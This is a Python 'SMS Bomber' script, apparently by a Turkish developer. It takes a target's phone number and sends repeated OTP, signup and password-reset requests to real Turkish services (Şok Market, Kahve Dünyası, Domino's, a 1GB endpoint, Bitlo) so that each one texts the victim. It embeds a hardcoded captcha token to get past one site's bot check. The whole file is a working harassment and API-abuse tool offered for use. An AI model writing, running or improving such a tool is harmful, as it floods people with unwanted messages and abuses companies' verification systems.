import requests
import time
from bs4 import BeautifulSoup
from colorama import init, Fore

init(autoreset=True)


sms = ["████████████████████████████  ███████                       ███████  ████████████████████████████",
       "████████████████████████████  ████████████             ████████████  ████████████████████████████",
       "████████████████████████████  █████████████           █████████████  ████████████████████████████",
       "████████████████████████████  ███████████████       ███████████████  ████████████████████████████",
       "██████████                    ████████████████     ████████████████  ██████████",
       "██████████                    ███████   ███████   ███████   ███████  ██████████",
       "██████████                    ███████    ███████ ███████    ███████  ██████████",
       "██████████                    ███████      ███████████      ███████  ██████████",
       "████████████████████████████  ███████        ███████        ███████  ████████████████████████████",
       "████████████████████████████  ███████                       ███████  ████████████████████████████",
       "████████████████████████████  ███████                       ███████  ████████████████████████████",
       "████████████████████████████  ███████                       ███████  ████████████████████████████",
       "                  ██████████  ███████                       ███████                    ██████████",
       "                  ██████████  ███████                       ███████                    ██████████",
       "                  ██████████  ███████                       ███████                    ██████████",
       "                  ██████████  ███████                       ███████                    ██████████",
       "████████████████████████████  ███████                       ███████  ████████████████████████████",
       "████████████████████████████  ███████                       ███████  ████████████████████████████",
       "████████████████████████████  ███████                       ███████  ████████████████████████████",
       "████████████████████████████  ███████                       ███████  ████████████████████████████",
       ]




flx = [
    "███████████████████████████████      ███████████                        ███████████        ███████████",
    "██████████████████████████████       ███████████                        ███████████        ███████████",
    "█████████████████████████████        ███████████                         ███████████      ███████████",
    "████████████████████████████         ███████████                          ███████████    ███████████",
    "███████████                          ███████████                           ███████████  ███████████",
    "███████████                          ███████████                             █████████████████████",
    "███████████                          ███████████                              ███████████████████",
    "███████████                          ███████████                               █████████████████",
    "███████████                          ███████████                                 █████████████",
    "█████████████████████                ███████████                                   █████████",
    "████████████████████                 ███████████                                 ████████████",
    "███████████████████                  ███████████                               ████████████████",
    "██████████████████                   ███████████                              ██████████████████",
    "███████████                          ███████████                             ████████████████████",
    "███████████                          ███████████                            ██████████████████████",
    "███████████                          ███████████                           ███████████  ███████████",
    "███████████                          ████████████████████████████         ███████████    ███████████",
    "███████████                          ████████████████████████████        ███████████      ███████████",
    "███████████                          ████████████████████████████       ███████████        ███████████",
    "███████████                          ████████████████████████████       ███████████        ███████████",
]

for line in flx:
    print(Fore.RED + line)

print("Developer By : FLX                    Sms Bomber")
print("\n\nGeliştirme aşamasındadır. Önerilerinizi Discorddan Yazabilirsiniz.")
print("Discord: " + Fore.RED +"flx_")

while True:
    numara = input("Numara (başında 0 olmadan, 10 haneli): ")

    if not numara.isdigit():
        print(Fore.RED + "[!] Lütfen sadece rakam girin.")
    elif len(numara) != 10:
        print(Fore.RED + "[!] Numara 10 haneli olmalıdır. (örn: 5346773489)")
    else:
        break

print("\n"*500)
init(autoreset=True)

for line2 in sms:
    print(Fore.RED + line2)
print("")
print(Fore.BLUE + "SMS Boomber Başlıyor...")
time.sleep(5)

# === SOK MARKET ===
sok = "https://giris.ec.sokmarket.com.tr/api/authentication/otp-registration/generate"
payload = {
    "clientId": "buyer-web",
    "phoneNumber": numara,
    "captchaToken": "",
    "captchaAction": "generate_register_otp",
    "reCaptchaV2": False
}
headers = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0"
}
response = requests.post(sok, json=payload, headers=headers)
if response.status_code == 200:
    print(Fore.GREEN +"[+] Sok Başarılı!")
else:
    print(Fore.RED + "[-] Sok Başarısız!")

time.sleep(2)

# === KAHVE DÜNYASI ===
kahvedunyasi = "https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number"
payload = {
    "phoneNumber": numara,
    "countryCode": "90"
}
response2 = requests.post(kahvedunyasi, json=payload, headers=headers)
if response2.status_code == 200:
    print(Fore.GREEN +"[+] KahveDünyası Başarılı!")
else:
    print(Fore.RED +"[-] KahveDünyası Başarısız!")

time.sleep(2)

# === DOMINO'S ===
dominos = "https://frontend.dominos.com.tr/api/authentication/sendLoginOtpCode"
payload = {
    "captchaToken": "03AFcWeA77_dUrjbVv29lEgFNStyGsGmxEXCmxDHyyL_PlL_zpjMfa9gb1aTwzozGNofJf3ysKhfjqavxmF7VbidZ2iMq-wAMOJaZPJYBmnThpWJA8xdLnrpzF34NiGhkwG1WE6ls9S8ng_DVLcfXtv1Q8AjP_EOxZNYS-e8Ph4CE2i4JYsfp3EhMKPGyRJPbUh2oZ3EJ_VhhhzLQZLce-qZlC-a-dWXeeE2Wbgv4p53udBO4Sh3jlwUIEpZhB4WQvLE4znkOqUU9lmErIFZaZQ7XCiiwABa_ba6b_jbQprP2bBbx2AO4n5QKl2fPDTFRZRFbJqHS_t7pBJgk5zuVU9NMRZINNNKFbld8NXdk3QC6HIeT7VK6txDzIUs8xdZ1EoqepIvVaEN4d_ZAtOuHnbQodwKbcUnhYVv-pJ3ige-xx0UO7-LZJ3if4wDa7UnooW1XsPjzPdsoMBItd_0nHnz6zv_zvJaYwZCkfLjN1LJ1D_nfjF5OrBRgY0v21FkPqw6rs_H-VmQo1wT7VnBENic7zyxLC4CxVvMq8U-sw1Ot_lDv83tAbdfMRnfHxNl4j82MGYTCoyihpHJMWYdnuXips_HepOgt_T_x4GBseomuqSNIDOyT2DE1of1_cASEHGW0Zrjxeu3patPHlUsjbAHlyvojmRsCsPY9VYw48R36B6l032kogGBW2JMgz4UG2Wl0ZXUKJPxbWhX_ImAKBN9l5Urnnf10YCk4zciTVcFDIwarUVPXPFykL2VYC457zQADuub7JMZq96SBaHFCE_Zbkjp9HQcpYsASab7LkFC2LqV1KWwylU4WiPyNKBSqMyACxL_AjMJOyhfKjSGwjaonyHm3gfGCUjJMSbrJVZv9D-FtsKygo4jDc1cr1haYuvuqNBW-xcoETkGzL793syfcTaAlwJ53gH1Ke0YhH95gl1ZwrRhuGgF8",
    "channelCode": "WEB",
    "email": "",
    "isRegisterV2": False,
    "isSure": False,
    "mobilePhone": numara,
}
response3 = requests.post(dominos, json=payload, headers=headers)
if response3.status_code == 200:
    print(Fore.GREEN + "[+] Dominos Başarılı")
else:
    print(Fore.RED +"[-] Dominos Başarısız")



time.sleep(2)






BİRGB = "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/pin/send-otp"
payload = {
    "msisdn" :  numara
}
response4 = requests.post(BİRGB, json=payload, headers=headers)
if response.status_code == 200:
    print(Fore.GREEN + "[+] 1GB Başarılı")
else:
    print(Fore.RED + "[-] 1GB Başarısız")




    time.sleep(2)




bitlo = "https://api.bitlo.com/auth/forgot-password"
payload = {
    "identifier": "+90" + numara,
}
response5 = requests.post(bitlo, json=payload, headers=headers)
if response5.status_code == 200:
    print(Fore.GREEN +"[+] Bitlo Başarılı")
else:
    print(Fore.RED +"[-] Bitlo Başarısız!")

    print("\n"* 500)
    print("Önerilerinizi Bekliyorum.\nTest / Geliştirme Aşamasındadır.")